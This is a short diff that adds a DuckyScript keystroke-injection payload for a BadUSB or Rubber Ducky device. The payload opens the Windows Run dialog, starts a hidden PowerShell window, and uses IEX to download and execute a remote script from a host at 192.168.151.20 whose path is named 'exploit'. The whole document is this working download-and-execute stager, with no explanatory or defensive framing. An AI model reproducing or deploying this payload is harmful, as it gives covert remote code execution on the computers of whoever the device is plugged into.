@@ -1,0 +1,7 @@
+```
+DELAY 500
+GUI r
+DELAY 100
+STRING powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://192.168.151.20:8080/exploit');
+ENTER
+´´´
